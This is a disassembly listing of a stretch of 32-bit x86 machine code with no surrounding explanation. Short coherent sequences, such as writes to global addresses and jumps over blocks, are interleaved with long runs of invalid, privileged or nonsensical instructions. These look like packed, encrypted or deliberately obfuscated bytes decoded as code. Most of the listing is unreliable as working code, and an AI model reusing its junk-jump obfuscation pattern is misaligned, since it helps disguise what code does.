  402041:	ds hlt 
  402043:	mov    ebx,0x41dc190f
  402048:	inc    esi
  402049:	push   0xe364f475
  40204e:	jmp    0xdd807206
  402053:	mov    cl,0x53
  402055:	es mov ch,0x58
  402058:	cli    
  402059:	das    
  40205a:	shr    DWORD PTR [edx-0x2a],1
  40205d:	mov    ds:0x97263939,eax
  402062:	mov    al,ds:0x51251ef7
  402067:	push   esi
  402068:	jmp    0x2db961af
  40206d:	adc    DWORD PTR [ebp+eiz*2-0x1faa7456],eax
  402074:	mov    DWORD PTR [ebp-0x2c],0x4eb9
  40207b:	mov    DWORD PTR ds:0x42ee24,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
  402087:	mov    DWORD PTR ds:0x42e75a,0x1170
  402091:	je     0x40384c
  402097:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40209e:	sub    DWORD PTR ds:0x42e762,edx
  4020a4:	lea    eax,[ebp-0xc]
  4020a7:	mov    DWORD PTR [ebp-0x10],eax
  4020aa:	sub    edx,eax
  4020ac:	mov    eax,DWORD PTR [ebp-0x10]
  4020af:	not    edx
  4020b1:	jmp    0x402462
  4020b6:	inc    esi
  4020b7:	test   BYTE PTR [edx],bh
  4020b9:	xchg   esp,edi
  4020bb:	mov    ecx,0xed0c457b
  4020c0:	ror    BYTE PTR [esi-0x2d865922],1
  4020c6:	into   
  4020c7:	or     al,0x7e
  4020c9:	jle    0x40204d
  4020cb:	jno    0x40214b
  4020cd:	jle    0x40211d
  4020cf:	inc    ebx
  4020d0:	add    ch,BYTE PTR [esi-0x7e]
  4020d3:	jge    0x4020b4
  4020d5:	shl    ch,0x58
  4020d8:	imul   edi,DWORD PTR [ebx],0x2f
  4020db:	test   al,0x1e
  4020dd:	call   0x2078:0xb99462ef
  4020e4:	dec    esi
  4020e5:	in     eax,dx
  4020e6:	pop    esp
  4020e7:	xor    al,0xd9
  4020e9:	ret    0x1f1e
  4020ec:	clc    
  4020ed:	cdq    
  4020ee:	sbb    DWORD PTR [ecx-0x46],0xffffffc1
  4020f2:	inc    edx
  4020f3:	(bad)  
  4020f4:	call   0x5f20cd3f
  4020f9:	ja     0x40210e
  4020fb:	and    BYTE PTR [edx],al
  4020fd:	add    DWORD PTR [esi],esi
  4020ff:	jmp    0xb51cf7cc
  402104:	push   ebx
  402105:	std    
  402106:	xor    eax,0x7309e52d
  40210b:	retf   
  40210c:	js     0x40210b
  40210e:	mov    ebp,0xd1dd8daf
  402113:	mov    ecx,0xca89b338
  402118:	pop    edx
  402119:	or     BYTE PTR [edi-0x3c],bh
  40211c:	in     al,0x5a
  40211e:	sbb    ebp,edi
  402120:	adc    ch,BYTE PTR [edx+edx*8+0x3cb26545]
  402127:	push   ebp
  402128:	mov    ch,0x9a
  40212a:	lds    ecx,FWORD PTR [esi]
  40212c:	call   FWORD PTR [eax+0x78]
  40212f:	or     ch,BYTE PTR [ebx-0x7d]
  402132:	push   edi
  402133:	mov    ch,0x4d
  402135:	mov    bl,0x83
  402137:	sub    DWORD PTR [ecx-0x2c9c5715],ecx
  40213d:	push   ss
  40213e:	mov    ds:0xe580b01,al
  402143:	rcpps  xmm2,xmm0
  402146:	mov    ds:0xca7614c8,eax
  40214b:	in     eax,dx
  40214c:	ss adc bl,ah
  40214f:	sbb    bh,cl
  402151:	lods   eax,DWORD PTR ds:[esi]
  402152:	ins    DWORD PTR es:[edi],dx
  402153:	and    ebp,DWORD PTR [eax+0x7d8b09c4]
  402159:	push   ss
  40215a:	(bad)  
  40215b:	mov    DWORD PTR [ecx],esi
  40215d:	imul   edx,DWORD PTR ds:0x76f46330,0x6cb45ea4
  402167:	rcl    BYTE PTR ds:0x72074bc8,1
  40216d:	push   ebp
  40216e:	jg     0x4021c6
  402170:	jmp    0x402194
  402172:	jbe    0x402120
  402174:	addr16 mov eax,ds:0x3081
  402178:	mov    cl,0x64
  40217a:	fsubrp st(6),st
  40217c:	in     al,dx
  40217d:	dec    ebx
  40217e:	sar    DWORD PTR [ecx+ebx*2+0x11888a17],1
  402185:	or     DWORD PTR [ebx+0x5fe29b8c],0xffffffe3
  40218c:	sub    BYTE PTR [edi+0x62558e27],bl
  402192:	ds int3 
  402194:	lods   al,BYTE PTR ds:[esi]
  402195:	rcl    BYTE PTR [esi+ebx*4],cl
  402198:	inc    ebp
  402199:	pop    ebp
  40219a:	sub    al,0xc1
  40219c:	jecxz  0x4021e9
  40219e:	ds jecxz 0x4021a5
  4021a1:	jmp    0x402125
  4021a3:	add    bl,0xad
  4021a6:	dec    esp
  4021a7:	sub    edx,esi
  4021a9:	in     al,0x5e
  4021ab:	xchg   BYTE PTR [edi],bh
  4021ad:	pop    ss
  4021ae:	inc    edi
  4021af:	mov    cl,0x43
  4021b1:	sets   ch
  4021b4:	fwait
  4021b5:	gs lock int 0xc9
  4021b9:	jecxz  0x40215e
  4021bb:	sbb    al,BYTE PTR [esi+0x43a6d844]
  4021c1:	test   DWORD PTR [ebp-0x5b],edi
  4021c4:	sub    al,BYTE PTR [edx]
  4021c6:	icebp  
  4021c7:	xchg   ebp,eax
  4021c8:	mov    dl,0xc1
  4021ca:	rol    BYTE PTR [ebx],0x4c
  4021cd:	out    0xb1,eax
  4021cf:	mov    edi,0x75631389
  4021d4:	std    
  4021d5:	push   cs
  4021d6:	pop    ss
  4021d7:	(bad)  
  4021d8:	in     eax,0xc2
  4021da:	push   0xffffffef
  4021dc:	(bad)  
  4021dd:	lahf   
  4021de:	fist   WORD PTR ds:0xf37a5a59
  4021e4:	scas   eax,DWORD PTR es:[edi]
  4021e5:	push   edx
  4021e6:	xor    BYTE PTR [eax+ecx*8+0x13],ah
  4021ea:	popa   
  4021eb:	push   eax
  4021ec:	hlt    
  4021ed:	ficom  WORD PTR [ecx+edi*1]
  4021f0:	ror    BYTE PTR [edi+0x2f],0x26
  4021f4:	mov    WORD PTR [eax],gs
  4021f6:	inc    ecx
  4021f7:	(bad)
  4021fa:	lahf   
  4021fb:	push   0x58
  4021fd:	pop    ebp
  4021fe:	and    eax,0x1619e244
  402203:	xchg   esp,eax
  402204:	xchg   eax,esp
  402206:	repz and DWORD PTR [ebx-0x44],ebx
  40220a:	into   
  40220b:	std    
  40220c:	jae    0x40224e
  40220e:	xchg   edx,eax
  40220f:	scas   al,BYTE PTR es:[edi]
  402210:	lds    ebp,FWORD PTR [ecx-0x2e]
  402213:	lock aaa 
  402215:	in     al,dx
  402216:	sbb    DWORD PTR [ecx-0x67],ebx
  402219:	add    al,0x88
  40221b:	mov    ecx,0xacfd7c83
  402220:	jno    0x4021fb
  402222:	(bad)  
  402223:	xchg   esp,eax
  402224:	cwde   
  402225:	xchg   edx,eax
  402226:	popa   
  402227:	jns    0x402284
  402229:	ja     0x4022a1
  40222b:	cmp    esp,DWORD PTR [edi+0x7a]
  40222e:	test   BYTE PTR [edx],bl
  402230:	cwde   
  402231:	sahf   
  402232:	xchg   ecx,eax
  402233:	test   eax,0x95460156
  402238:	retf   0x647
  40223b:	sbb    al,bh
  40223d:	aas    
  40223e:	mov    dl,0x3c
  402240:	mov    ebp,0xecdb4ac3
  402245:	jp     0x4022a1
  402247:	jg     0x4022a7
  402249:	sbb    edi,DWORD PTR [esi-0x7e]
  40224c:	mov    esi,0x29ada2c0
  402251:	mov    WORD PTR [edi+0xc],?
  402254:	stc    
  402255:	mov    eax,ds:0xcc0a8d3
  40225a:	popf   
  40225b:	gs in  eax,dx
  40225d:	out    0x83,eax
  40225f:	outs   dx,BYTE PTR ds:[esi]
  402260:	in     eax,dx
  402261:	ds out 0x31,eax
  402264:	in     eax,0xa0
  402266:	icebp  
  402267:	and    dh,BYTE PTR [ebp+0x73ed3c7e]
  40226d:	imul   ebx,ecx,0x6783a9b1
  402273:	inc    ebp
  402274:	push   0xffffffe2
  402276:	iret   
  402277:	scas   eax,DWORD PTR es:[edi]
  402278:	add    eax,0x93f607e
  40227d:	clc    
  40227e:	into   
  40227f:	inc    eax
  402280:	push   0x23
  402282:	(bad)  
  402283:	lock dec esp
  402285:	sbb    al,0xed
  402287:	int    0xeb
  402289:	push   es
  40228a:	mov    bh,0xf6
  40228c:	hlt    
  40228d:	outs   dx,DWORD PTR ds:[esi]
  40228e:	inc    esi
  40228f:	test   al,0x88
  402291:	rcl    DWORD PTR [eax+0x34],cl
  402294:	cmc    
  402295:	test   al,ch
  402297:	data16 (bad) 
  402299:	jae    0x402269
  40229b:	rcl    edx,1
  40229d:	ret    
  40229e:	loope  0x4022bf
  4022a0:	cmp    bl,BYTE PTR [ebx+0x5c5c0362]
  4022a6:	loope  0x4022c9
  4022a8:	leave  
  4022a9:	or     bh,ah
  4022ab:	fwait
  4022ac:	adc    al,0xb0
  4022ae:	daa    
  4022af:	mov    al,al
  4022b1:	inc    edx
  4022b2:	out    0xdd,al
  4022b4:	fisttp QWORD PTR [ebx]
  4022b6:	mov    dl,ch
  4022b8:	inc    edi
  4022b9:	aam    0x27
  4022bb:	std    
  4022bc:	call   0x8339:0x4319d5c9
  4022c3:	test   DWORD PTR [edi-0x582d7a80],0xd562d748
  4022cd:	aas    
  4022ce:	mov    eax,0xd1661a0a
  4022d3:	pop    es
  4022d4:	mov    ebx,cr1
  4022d7:	mov    eax,0xfe06a03f
  4022dc:	mov    ebp,0x3e9f44ae
  4022e1:	(bad)
  4022e4:	xlat   BYTE PTR ds:[ebx]
  4022e5:	lahf   
  4022e6:	int3   
  4022e7:	add    BYTE PTR [esp+eax*2],bh
  4022ea:	ins    DWORD PTR es:[edi],dx
  4022eb:	mov    ah,0x2a
  4022ed:	adc    al,0x46
  4022ef:	or     esp,DWORD PTR [ecx]
  4022f1:	xchg   bh,dh
  4022f3:	test   DWORD PTR [ebp-0x7b18358],ebx
  4022f9:	pushf  
  4022fa:	jge    0x40229e
  4022fc:	loope  0x4022c7
  4022fe:	sar    dh,0x26
  402301:	cs cld 
  402303:	xchg   ebx,eax
  402304:	add    eax,0x8cc340ad
  402309:	in     al,0x44
  40230b:	mov    eax,0x302c1272
  402310:	jmp    DWORD PTR [ecx+0x74]
  402313:	sub    ebp,DWORD PTR [edi-0x46fba773]
  402319:	pop    ecx
  40231a:	addr16 pop esp
  40231c:	xchg   ebx,eax
  40231d:	pop    ecx
  40231e:	add    BYTE PTR ds:0x205eaee7,bh
  402324:	rcr    BYTE PTR [eax],cl
  402326:	add    DWORD PTR [ebp-0x78],esi
  402329:	rcr    BYTE PTR [ebx+0x5e],0xb0
  40232d:	pop    esi
  40232e:	adc    edi,0xc02a80a4
  402334:	xor    edx,edx
  402336:	sub    DWORD PTR [edx-0x2d],ecx
  402339:	scas   al,BYTE PTR es:[edi]
  40233a:	outs   dx,DWORD PTR ds:[esi]
  40233b:	icebp  
  40233c:	pop    eax
  40233d:	mov    ecx,0x17677934
  402342:	fmul   QWORD PTR ds:0x16d65966
  402348:	shr    BYTE PTR [edx-0x38],0xbd
  40234c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40234d:	mov    es,WORD PTR [ebx+edi*8-0x5485f4cb]
  402354:	push   esp
  402355:	(bad)  
  402356:	jae    0x402367
  402358:	mov    ch,0xa7
  40235a:	(bad)  
  40235b:	jno    0x4023c3
  40235d:	repnz push 0x31
  402360:	adc    DWORD PTR [ebp-0x77],eax
  402363:	cs icebp 
  402365:	mov    al,BYTE PTR [esi+0x3]
  402368:	dec    esi
  402369:	adc    bl,cl
  40236b:	push   ds
  40236c:	sub    bl,cl
  40236e:	and    eax,0xcb336f6
  402373:	fbstp  TBYTE PTR [ebx-0x10566a84]
  402379:	sbb    esp,ebp
  40237b:	ret    0xfb73
  40237e:	mov    al,0xb1
  402380:	inc    esp
  402381:	inc    edi
  402382:	mov    es,WORD PTR [edi-0x42215336]
  402388:	sbb    ch,BYTE PTR [edx+0x23955d1b]
  40238e:	dec    edx
  40238f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402390:	push   edi
  402391:	dec    ebx
  402392:	fsubrp st(1),st
  402394:	xchg   ebp,eax
  402395:	or     BYTE PTR [ecx+edi*4-0x1f],dl
  402399:	rol    DWORD PTR [eax],cl
  40239b:	and    edx,DWORD PTR ds:0xf6699ed0
  4023a1:	xchg   esp,eax
  4023a2:	xor    BYTE PTR [ecx-0x8d0cf48],0xe3
  4023a9:	pop    esp
  4023aa:	adc    eax,ecx
  4023ac:	shr    DWORD PTR [ebp+edx*1-0x504d77e9],0x0
  4023b4:	popa   
  4023b5:	add    eax,0xd08f5391
  4023ba:	shr    BYTE PTR [eax-0x5c],1
  4023bd:	and    eax,0x6b63baf2
  4023c2:	inc    esi
  4023c3:	gs fcmovb st,st(2)
  4023c6:	neg    DWORD PTR [ebp+0x79352a4a]
  4023cc:	sbb    BYTE PTR [eax],ah
  4023ce:	lods   eax,DWORD PTR ds:[esi]
  4023cf:	fst    DWORD PTR [edx-0x3a]
  4023d2:	daa    
  4023d3:	out    0xf1,al
  4023d5:	call   0x9d62:0xf550d066
  4023dc:	pop    eax
  4023dd:	jb     0x4023a3
  4023df:	es jmp 0x4023fe
  4023e2:	lods   al,BYTE PTR ds:[esi]
  4023e3:	out    dx,eax
  4023e4:	mov    bh,0x7d
  4023e6:	inc    ebp
  4023e7:	sbb    DWORD PTR [ecx-0x39bdced6],ebx
  4023ed:	inc    ebx
  4023ee:	lods   al,BYTE PTR ds:[esi]
  4023ef:	and    eax,0xd8921147
  4023f4:	pextrw ebp,(bad),0xc5
  4023f6:	test   al,0x64
  4023f8:	inc    esp
  4023f9:	cdq    
  4023fa:	fcom   DWORD PTR [edx+0x28]
  4023fd:	neg    BYTE PTR [eax]
  4023ff:	test   al,0xb7
  402401:	test   al,0x81
  402403:	jp     0x40239f
  402405:	gs inc edx
  402407:	mov    al,0xc9
  402409:	fisttp DWORD PTR [ebx+eiz*2+0x7f097921]
  402410:	mov    al,BYTE PTR [edx+ebx*4+0x536c3631]
  402417:	cmc    
  402418:	mov    ah,0x54
  40241a:	mov    al,BYTE PTR [ebx]
  40241c:	shl    DWORD PTR [edi],0x46
  40241f:	lds    ecx,FWORD PTR [edx]
  402421:	inc    edx
  402422:	cmp    DWORD PTR [edi-0x2a],edx
  402425:	lock pop ds
  402427:	ror    eax,cl
  402429:	mov    cl,0xc3
  40242b:	pop    edi
  40242c:	sbb    ecx,DWORD PTR [ecx-0x217f8766]
  402432:	or     al,0xb6
  402434:	sub    DWORD PTR [edi+0x3eeb7a9b],0xfffffff4
  40243b:	add    DWORD PTR ds:0xe1ccde1a,esp
  402441:	push   ecx
  402442:	cmp    al,0x50
  402444:	sbb    ebp,edi
  402446:	sub    eax,0xf944779
  40244b:	push   esp
  40244c:	or     ah,BYTE PTR [esi+0x329a40e]
  402452:	xor    cl,BYTE PTR [ebx]
  402454:	in     eax,0xad
  402456:	push   es
  402457:	jmp    0xcfb7d3bb
  40245c:	fndisi(8087 only) 
  40245e:	or     ecx,ebp
  402460:	les    eax,FWORD PTR [eax]
  402462:	mov    edx,DWORD PTR [eax]
  402464:	imul   edx,edx,0xf89ea9ee
  40246a:	mov    DWORD PTR ds:0x430546,0x7964
  402474:	mov    DWORD PTR [eax],edx
  402476:	mov    DWORD PTR ds:0x4304be,0x7646
  402480:	mov    eax,DWORD PTR [ebp-0xc]
  402483:	cmp    eax,0x823721f2
  402488:	mov    DWORD PTR ds:0x4304ba,0x4bbf
  402492:	je     0x4028be
  402498:	and    ebx,0x6650
  40249e:	mov    eax,DWORD PTR [ebp-0x1c]
  4024a1:	jmp    0x402852
  4024a6:	inc    esi
  4024a7:	xchg   DWORD PTR [ecx],esp
  4024a9:	jmp    0x50e0:0xbb5d6ce1
  4024b0:	dec    eax
  4024b1:	xchg   ecx,eax
  4024b2:	iret   
  4024b3:	cmc    
  4024b4:	test   dh,bh
  4024b6:	push   edx
  4024b7:	movd   DWORD PTR [esi-0x7e],mm7
  4024bb:	jno    0x40253b
  4024bd:	jle    0x40244f
  4024bf:	mov    bh,0x9c
  4024c1:	cli    
  4024c2:	fisubr DWORD PTR [ebx+0x4fbbedc]
  4024c8:	cmp    eax,esi
  4024ca:	fcomp  DWORD PTR [ebx]
  4024cc:	pop    esp
  4024cd:	clc    
  4024ce:	lock out 0x35,al
  4024d1:	pop    esi
  4024d2:	loopne 0x4024d7
  4024d4:	aad    0xd3
  4024d6:	xchg   ebx,eax
  4024d7:	ins    DWORD PTR es:[edi],dx
  4024d8:	mov    esi,0x6ef4aa6e
  4024dd:	mov    edx,0xbc82b9ee
  4024e2:	retf   0x2807
  4024e5:	and    BYTE PTR [ebx+0x5bfad615],0x96
  4024ec:	dec    edi
  4024ed:	pusha  
  4024ee:	stc    
  4024ef:	dec    esp
  4024f0:	dec    esp
  4024f1:	pop    ebx
  4024f2:	xchg   DWORD PTR [ecx+0x64],edx
  4024f5:	or     BYTE PTR [eax+eiz*1-0x78],dh
  4024f9:	lods   eax,DWORD PTR ds:[esi]
  4024fa:	retf   
  4024fb:	les    esi,FWORD PTR [esp+edx*2-0x7bc4c76c]
  402502:	push   es
  402503:	sub    eax,0x2775944e
  402508:	repnz xchg edx,eax
  40250a:	in     al,dx
  40250b:	ret    0x9a2a
  40250e:	imul   eax,DWORD PTR [edi+0x33],0x43
  402512:	xor    esp,DWORD PTR [esi]
  402514:	xchg   DWORD PTR ds:0x66171004,ebp
  40251a:	inc    edi
  40251b:	adc    eax,0xa8b13c32
  402520:	push   ebp
  402521:	jge    0x402573
  402523:	fcom   QWORD PTR [ebp-0x17]
  402526:	inc    ebp
  402527:	inc    edx
  402528:	(bad)  
  402529:	xchg   edx,eax
  40252a:	pusha  
  40252b:	mov    al,0x71
  40252d:	mov    esi,DWORD PTR [esi-0x581a7bef]
  402533:	add    BYTE PTR [eax-0x2f],bh
  402536:	sbb    DWORD PTR [edi],edi
  402538:	ja     0x4024cc
  40253a:	inc    eax
  40253b:	dec    edi
  40253c:	fmul   QWORD PTR [ebp+ebx*2-0x17]
  402540:	xchg   esp,eax
  402541:	xchg   BYTE PTR [ebx+0x626e23d3],ah
  402547:	pop    ebx
  402548:	or     al,0x45
  40254a:	sub    esi,ecx
  40254c:	add    ecx,DWORD PTR [ebp+0xfe969ca]
  402552:	xchg   edi,eax
  402553:	lock outs dx,BYTE PTR ds:[esi]
  402555:	scas   eax,DWORD PTR es:[edi]
  402556:	popa   
  402557:	mov    BYTE PTR [ebx+ebx*1],bl
  40255a:	popf   
  40255b:	out    dx,eax
  40255c:	or     al,0x4d
  40255e:	push   ds
  40255f:	and    esi,DWORD PTR [edi]
  402561:	push   edx
  402562:	inc    esi
  402563:	xor    dl,BYTE PTR [edi*1+0x8540e7]
  40256a:	pop    esp
  40256b:	sbb    edx,edx
  40256d:	(bad)  
  40256e:	or     ch,BYTE PTR [esi]
  402570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402571:	pop    ebp
  402572:	jno    0x4025e7
  402574:	dec    esi
  402575:	in     eax,0x26
  402577:	mov    dl,BYTE PTR [eax+0x60]
  40257a:	or     al,0x50
  40257c:	int3   
  40257d:	sub    BYTE PTR [edx],0x47
  402580:	inc    ebp
  402581:	sahf   
  402582:	imul   ebp,DWORD PTR [esi+0x365f2140],0x9a8da71d
  40258c:	add    DWORD PTR [edi+0x75],0xffffff87
  402590:	aas    
  402591:	add    BYTE PTR fs:[edx-0x3dd16f09],0x1b
  402599:	dec    ebp
  40259a:	mov    ebp,0x7bd691d8
  40259f:	enter  0x4d14,0x77
  4025a3:	fwait
  4025a4:	mov    al,0x1a
  4025a6:	les    ecx,FWORD PTR [ebp+0x2d]
  4025a9:	xchg   ebp,eax
  4025aa:	push   ds
  4025ab:	popf   
  4025ac:	loope  0x402531
  4025ae:	inc    eax
  4025af:	mov    ecx,0x5e355c4d
  4025b4:	fcomp  DWORD PTR [edi-0x51c62e1e]
  4025ba:	lock jns 0x4025d4
  4025bd:	mov    ds,esp
  4025bf:	popa   
  4025c0:	cdq    
  4025c1:	xor    al,0xbd
  4025c3:	fxch   st(1)
  4025c5:	pop    ss
  4025c6:	aaa    
  4025c7:	aam    0x1e
  4025c9:	pushf  
  4025ca:	fyl2xp1 
  4025cc:	jl     0x4025a1
  4025ce:	mov    ebp,0x3ee7e20d
  4025d3:	jo     0x402556
  4025d5:	jle    0x4025cd
  4025d7:	int3   
  4025d8:	daa    
  4025d9:	sbb    BYTE PTR [ebx-0x663d1414],cl
  4025df:	sbb    dl,dh
  4025e1:	xlat   BYTE PTR ds:[ebx]
  4025e2:	stc    
  4025e3:	loop   0x402629
  4025e5:	or     eax,0xae913734
  4025ea:	iret   
  4025eb:	dec    ecx
  4025ec:	adc    eax,0xb07496b6
  4025f1:	sub    DWORD PTR [edi+0x38],ebp
  4025f4:	cmp    BYTE PTR [esi],ch
  4025f6:	lods   eax,DWORD PTR ds:[esi]
  4025f7:	icebp  
  4025f8:	and    eax,0x271663c9
  4025fd:	inc    eax
  4025fe:	dec    edi
  4025ff:	int    0xe
  402601:	lea    eax,[edi-0x11]
  402604:	fld    DWORD PTR [esi+0x3914e34f]
  40260a:	cwde   
  40260b:	sbb    al,0x33
  40260d:	inc    edx
  40260e:	jp     0x40263b
  402610:	aas    
  402611:	cmc    
  402612:	xor    esi,DWORD PTR [ebp-0x3d]
  402615:	add    edx,DWORD PTR [ebx+0x79dcb7ba]
  40261b:	cmp    BYTE PTR [esi+edx*1],dl
  40261e:	inc    eax
  40261f:	mov    ds:0x518a82e6,al
  402624:	sub    ebp,0x61
  402627:	pop    edi
  402628:	mov    dh,0xc9
  40262a:	fwait
  40262b:	dec    ebp
  40262c:	mov    ebx,0xde20121a
  402631:	outs   dx,DWORD PTR ds:[esi]
  402632:	jo     0x402643
  402634:	mov    BYTE PTR [ebx+0x51],ch
  402637:	pushf  
  402638:	in     eax,dx
  402639:	mov    BYTE PTR [ecx],dh
  40263b:	inc    BYTE PTR [ebp-0xf3a2c81]
  402641:	pop    esp
  402642:	mov    al,ds:0x2ee67976
  402647:	outs   dx,BYTE PTR ds:[esi]
  402648:	adc    edx,DWORD PTR [edi-0x453356eb]
  40264e:	push   eax
  40264f:	jae    0x4025d7
  402651:	fdiv   DWORD PTR [eax+0x505e23d3]
  402657:	lahf   
  402658:	jne    0x402628
  40265a:	jecxz  0x4025e3
  40265c:	mov    ss,WORD PTR [edi+0x75e4b9fe]
  402662:	and    DWORD PTR ds:0xce433e49,eax
  402668:	jp     0x40267f
  40266a:	adc    BYTE PTR [edx],dh
  40266c:	pop    esp
  40266d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40266e:	cwde   
  40266f:	mov    gs,esi
  402671:	inc    edi
  402672:	pop    edi
  402673:	cmp    eax,0xf5b1606f
  402678:	push   0x4f
  40267a:	ret    0xf82f
  40267d:	cdq    
  40267e:	jb     0x402656
  402680:	inc    esp
  402681:	and    ecx,DWORD PTR [ebp+ebp*1+0x7a]
  402685:	popf   
  402686:	into   
  402687:	rol    DWORD PTR [edx-0x4a2c0edb],cl
  40268d:	(bad)  
  40268e:	lahf   
  40268f:	or     al,0x8e
  402691:	xchg   esp,eax
  402692:	out    dx,al
  402693:	test   ch,dh
  402695:	push   eax
  402696:	nop
  402697:	daa    
  402698:	(bad)  
  402699:	js     0x40266e
  40269b:	mov    cl,0x35
  40269d:	les    esp,FWORD PTR [ebx-0x60]
  4026a0:	inc    ebx
  4026a1:	xor    eax,0x6ad28379
  4026a6:	and    eax,0x261b51c6
  4026ab:	sbb    bl,al
  4026ad:	inc    edx
  4026ae:	in     eax,dx
  4026af:	jo     0x402670
  4026b1:	xchg   DWORD PTR [esi-0x212a71d4],edi
  4026b7:	cmp    BYTE PTR [edx+0x7b59a5ac],bl
  4026bd:	jp     0x4026ee
  4026bf:	(bad)  
  4026c1:	jp     0x4026d8
  4026c3:	xor    bl,cl
  4026c5:	js     0x402669
  4026c7:	loope  0x402730
  4026c9:	push   ebx
  4026ca:	xor    ah,BYTE PTR [edx+edx*4]
  4026cd:	dec    ebp
  4026ce:	xor    dl,BYTE PTR [edx-0x6824ab97]
  4026d4:	sub    al,0xde
  4026d6:	xor    al,0x12
  4026d8:	sbb    bl,ah
  4026da:	xor    BYTE PTR ds:0xd6710808,dl
  4026e0:	dec    eax
  4026e1:	jmp    0x2e6:0xb593e813
  4026e8:	xchg   ebx,eax
  4026e9:	lahf   
  4026ea:	sub    bl,ch
  4026ec:	sub    ecx,edx
  4026ee:	adc    al,0xb6
  4026f0:	leave  
  4026f1:	push   ebx
  4026f2:	jne    0x402753
  4026f4:	aas    
  4026f5:	mov    esp,DWORD PTR [eax-0x526286c7]
  4026fb:	xor    DWORD PTR [edx+0x75],ecx
  4026fe:	shl    BYTE PTR [ebx+esi*1-0x5174ec29],1
  402705:	sbb    BYTE PTR [esi+0x25173cf0],ah
  40270b:	stos   DWORD PTR es:[edi],eax
  40270c:	ret    0x8672
  40270f:	pop    esi
  402710:	add    al,0x4b
  402712:	adc    cl,ch
  402714:	nop
  402715:	or     BYTE PTR [eax],cl
  402717:	xchg   esi,eax
  402718:	cli    
  402719:	outs   dx,DWORD PTR ds:[esi]
  40271a:	adc    ebp,edx
  40271c:	aad    0x84
  40271e:	dec    esi
  40271f:	scas   al,BYTE PTR es:[edi]
  402720:	jne    0x4026d8
  402722:	mov    WORD PTR [ecx+0x424e527a],?
  402728:	aam    0xd6
  40272a:	xchg   ebx,eax
  40272b:	mov    esp,0xe6ee4e0a
  402730:	popf   
  402731:	sub    DWORD PTR [eax+0x4d95429c],0x3c579d46
  40273b:	mov    dh,0xc8
  40273d:	mov    bh,0xa4
  40273f:	inc    edi
  402740:	xchg   edi,eax
  402741:	(bad)  
  402743:	test   eax,0xc15cfe26
  402748:	mov    ecx,0x89cb0183
  40274d:	pushf  
  40274e:	dec    esp
  40274f:	inc    ebp
  402750:	mov    ds:0x8881f42,al
  402755:	sub    al,0xe0
  402757:	dec    edx
  402758:	push   ds
  402759:	xchg   ecx,eax
  40275a:	and    bl,dh
  40275c:	fisub  WORD PTR [esi+0x17c1aa75]
  402762:	bound  esp,QWORD PTR [edi+0x43]
  402765:	loope  0x402794
  402767:	fwait
  402768:	dec    ecx
  402769:	aaa    
  40276a:	or     al,0x5b
  40276c:	sbb    al,0x1
  40276e:	frstor [ebx]
  402771:	add    al,0x98
  402773:	xor    al,0x61
  402775:	jle    0x4027bc
  402777:	and    eax,0xc5d7a4ba
  40277c:	neg    DWORD PTR [ebx-0x6347ca64]
  402782:	pop    ecx
  402783:	and    ecx,edi
  402785:	mov    ah,0xfd
  402787:	aas    
  402788:	mov    cl,0xc8
  40278a:	outs   dx,BYTE PTR ds:[esi]
  40278b:	mov    ebx,0x114e836a
  402790:	jle    0x402783
  402792:	or     ah,dh
  402794:	pop    ebp
  402795:	jns    0x4027f6
  402797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402798:	add    DWORD PTR [esp+esi*1+0x4ea51f9d],edi
  40279f:	sub    ecx,DWORD PTR [edi-0x4d]
  4027a2:	in     eax,0x2a
  4027a4:	cld    
  4027a5:	push   edi
  4027a6:	ds push 0x36
  4027a9:	push   0x2d305564
  4027ae:	pop    ecx
  4027af:	pop    ds
  4027b0:	or     DWORD PTR [esi+0x38f28234],0xffffffed
  4027b7:	xor    bl,BYTE PTR [ebx+ecx*4+0x2]
  4027bb:	cmp    DWORD PTR [eax],0x4ae4beb4
  4027c1:	stos   BYTE PTR es:[edi],al
  4027c2:	jecxz  0x402787
  4027c4:	fcomp  DWORD PTR [edi+ecx*8+0x7c]
  4027c8:	in     al,0xd7
  4027ca:	adc    DWORD PTR [edi+0x47f8910c],ebp
  4027d0:	call   0x9a26:0x9dcda384
  4027d7:	xchg   edi,eax
  4027d8:	mov    DWORD PTR [ebp-0x30a91430],eax
  4027de:	ret    
  4027df:	pusha  
  4027e0:	dec    edx
  4027e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027e2:	mov    WORD PTR [ecx+0x19],ss
  4027e5:	ds fucomi st,st(7)
  4027e8:	push   ebp
  4027e9:	data16 cmp ch,BYTE PTR [eax]
  4027ec:	out    dx,al
  4027ed:	or     esp,DWORD PTR [ebp+0x17]
  4027f0:	push   0x633fb310
  4027f5:	data16 sbb al,0x34
  4027f8:	push   es
  4027f9:	push   cs
  4027fa:	add    al,0xc9
  4027fc:	mov    eax,ds:0x1cb0334a
  402801:	(bad)
  402804:	call   0x2645c128
  402809:	es out dx,eax
  40280b:	rcl    ecx,cl
  40280d:	mov    bl,0xf1
  40280f:	dec    ebx
  402810:	push   ds
  402811:	xor    BYTE PTR [edi-0x180043fe],cl
  402817:	jae    0x4027a2
  402819:	cmp    al,BYTE PTR [ebp+0x77]
  40281c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40281d:	xor    dh,BYTE PTR gs:[ebp+0x23252df4]
  402824:	mov    ds:0xe953ba8b,al
  402829:	cmp    eax,0xf01c948c
  40282e:	jae    0x402844
  402830:	sbb    al,0x8
  402832:	push   ebp
  402833:	jge    0x40288c
  402835:	push   es
  402836:	inc    ecx
  402837:	sahf   
  402838:	jmp    0x2162bb8d
  40283d:	outs   dx,DWORD PTR ds:[esi]
  40283e:	jmp    0xfe36:0xc4729895
  402845:	jno    0x4028b8
  402847:	or     edx,ebp
  402849:	dec    edx
  40284a:	es cdq 
  40284c:	daa    
  40284d:	aam    0xbd
  40284f:	les    edi,FWORD PTR [edi]
  402851:	and    al,0x81
  402853:	or     BYTE PTR [esi-0x389f8ae4],bl
  402859:	add    eax,0x42e75e
  40285e:	adc    al,0x0
  402860:	add    BYTE PTR [eax],al
  402862:	cmp    DWORD PTR ds:0x42e75e,0x0
  402869:	je     0x4028b0
  40286f:	cmp    DWORD PTR ds:0x42e75e,0x6
